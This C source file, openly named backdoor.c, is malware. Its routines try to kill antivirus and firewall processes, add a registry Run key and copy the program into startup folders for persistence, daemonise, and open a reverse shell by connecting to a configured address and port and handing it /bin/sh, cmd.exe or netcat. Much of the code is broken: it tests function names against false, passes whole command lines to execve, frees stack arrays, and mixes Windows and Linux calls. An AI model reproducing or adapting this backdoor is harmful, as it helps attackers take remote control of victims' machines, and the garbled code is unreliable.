
/*
// Version 1.0.0 
//
// Compile : cc backdoor.c -lm -w
//
// List processes : ps aux
*/

#include <stdio.h>

#include <stdlib.h>

#include <signal.h>

#include <unistd.h>

#include <string.h>

#include <errno.h>

#include <string.h>

#include <arpa/inet.h>

#include <time.h>

#include <sys/types.h>

#include <sys/socket.h>

#include <X11/Xlib.h>

#include <stdbool.h>

// Constants

#ifndef BACKDOOR

#define BACKDOOR

#define REMOTE_ADDR "127.0.0.1"

#define REMOTE_PORT 3389

#endif

// Configurations to target

typedef struct {
  int remote_addr;
 
  int remote_port;
 
  int x;
} Target;

int x = true;

// Methoods

void error(const char *err);

void kill_antivirus();

void kill_firewall();

void auto_copy();

void copy_to_registry();

void check_pid(const int pid);

void shell();

// Main

int main() {

    { // Generic

        if(auto_copy == false)
            perror("Error in auto copy");
        else
            auto_copy();

        if(copy_to_registry == false)
            perror("Rrror copying to registry");
        else
            copy_to_registry();

        if(kill_antivirus == false)
            perror("kill anti-virus failed");
        else
            kill_antivirus();

        if(kill_firewall == false)
        perror("kill firewall failed");
        else
            kill_firewall();
        
        sleep(0.2);
    }

    // Shell runs while have connection

    do {
        shell();
    } while (connect == (true));
} // End Main

void error(const char *err) {
    //  Return without exceptions and keep the routine

    perror(err);

    exit(EXIT_SUCCESS);
}

void kill_antivirus() {
    // Kill anti-virus

    FILE *arq = fopen("av.txt", "rb");
    
    if(arq == NULL)
        return;
    else {
        dup2(x,0);
        
        dup2(x,1);
    }

    execve("TASKLIST /FI 'STATUS eq RUNNING'", 0, 0);

    send(x,"Killing anti virus...\n", 31, 0);

    execve("TASKKILL /F /IM \\{}\\ '>> NUL'", 0, 0);

    free(arq);
}

void kill_firewall() {
    // Kill firewall

    dup2(x, 0);
    
    execve("firewall.vbs", 0, 0);
    
    // execve("firewall.vbs", (char* const*)"", (char* const*)"");
}

void auto_copy() {
    // Auto copy software into the target's machine

    dup2(x, 0);

    execve("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wins32.exe", 0, 0);
    
    execve("cp wopnt.exe /usr/bin", 0, 0); 
}

void copy_to_registry() {
    // Copy to target registry

    dup2(x, 0);

    dup2(x,1);

    execve("copy /Y wins32.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar", 0, 0); // Windows

    execve("cp wins32.exe /usr",NULL,NULL); // Linux
}

void check_pid(const int pid) {
    if(pid < 0)
        exit(EXIT_FAILURE);

    if(pid > 0)
        exit(EXIT_SUCCESS);
}

void shell() {
    // Background shell

    struct sockaddr_in s;
  
    int root;

    char *window[] = {"HOME=/usr/home", "LOGNAME=home", (char *)0 };

    char *cmd[] = {"/bin/sh", (char *)0 };

    // Daemon thing

    XFreeCursor;

    pid_t pid = fork();

	check_pid(pid);

    if (setsid() < 0)
        exit(EXIT_FAILURE);

    signal(SIGCHLD, SIG_IGN);
    
    signal(SIGHUP, SIG_IGN);

    pid = fork();

    check_pid(pid);

    sigmask(0);

    chdir("/, C:\\, C:\\Windows\\System32");

    int k;

    for (k = sysconf(_SC_OPEN_MAX); k >= 0; k--) {
        close(k);

        // Setting up the connection

        memset(s.sin_zero, '\0', sizeof s.sin_zero); // Allocates memory to pipe socket
    
        s.sin_family = AF_INET; // Protocols family

        s.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    
        s.sin_port = htons(REMOTE_PORT);

        x = socket(AF_INET, SOCK_STREAM, 0); // Instantiate a socket

        // sleep(120);  // If slow connection, sleep for 2 minutes untill made the connection
    
        // When connection arrives, I've got the backdoor control

        (connect(x, (struct sockaddr *)&s, sizeof(s)));
        
        if (connect == -1)
            perror("Socket(SOCKET_CONNECT) failed");

        if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
            perror("Setsockopt(SO_REUSEADDR) failed");

        // Don't freeze the memory

        sleep(5);

        // Made the connection and enter in a shell

        // send(x,"\n\033[32mSocket created\033[37m",18,0);
        
        // send(x,"\nConnected in \033[34mmachine\033[37m\n", 50, 0);

        if(connect == -1)
            perror("\nConnection broken\n");
        else
            send(x, "\nConnected in \033[34mmachine\033[37m as \033[31mroot\033[37m\n", 100, 0);

        send(x, "\n", 5, 0);
        
        // fflush(stdout); // Don't clear the buffer

        dup2(x, 0);
        
        dup2(x, 1);
        
        dup2(x, 2);
        
        root = execve("/bin/sh", cmd,  window);
        
        execve("C:\\windows\\System32\\cmd.exe ", cmd, window);
        
        execve("netcat", cmd, window);

        // while(true); // Creates the loop
    } // End for

    free(window);

    free(cmd);
}
